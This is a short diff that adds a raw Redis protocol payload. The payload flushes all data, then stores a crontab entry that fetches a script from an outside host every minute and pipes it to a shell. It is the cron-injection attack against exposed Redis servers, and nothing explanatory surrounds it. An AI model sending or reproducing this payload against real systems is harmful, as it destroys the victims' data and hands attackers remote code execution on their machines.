@@ -1,0 +1,17 @@
+*2
+$6
+SELECT
+$1
+0
+*1
+$8
+flushall
+*3
+$3
+set
+$7
+trojan1
+$64
+
+*/1 * * * * curl -fsSL http://chrome.zer0day.ru:5050/mrx1 | sh
+
